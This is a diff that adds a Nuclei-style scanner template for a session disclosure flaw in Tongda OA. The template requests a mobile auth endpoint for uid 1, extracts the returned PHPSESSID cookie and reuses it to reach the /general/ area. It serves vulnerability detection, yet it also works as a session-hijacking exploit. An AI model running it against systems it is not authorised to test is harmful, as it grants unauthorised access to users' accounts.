@@ -1,0 +1,50 @@
+id: tongda-oa-session-disclosure
+info:
+  name: Tongda OA User SESSION Disclosure Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Tongda OA office system has a SESSION disclosure vulnerability that allows an attacker to retrieve the SESSION information of logged-in users, enabling unauthorized access to the system.
+  tags: information-disclosure
+  reference:
+    - https://mp.weixin.qq.com/s/llyGEBRo0t-C7xOLMDYfFQ
+
+variables:
+  uid: "1"
+
+http:
+  - id: session-check
+    method: GET
+    path:
+      - "/mobile/auth_mobi.php?isAvatar=1&uid={{uid}}&P_VER=0"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "PHPSESSID"
+    extractors:
+      - type: regex
+        name: phpsessid
+        internal: true
+        group: 1
+        part: header
+        regex:
+          - "Set-Cookie:\\s*PHPSESSID=([^;]+);"
+
+  - id: session-verification
+    method: GET
+    path:
+      - "/general/"
+    headers:
+      Cookie: "PHPSESSID={{phpsessid}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "general"
+      - type: regex
+        regex:
+          - "<title>.*</title>"
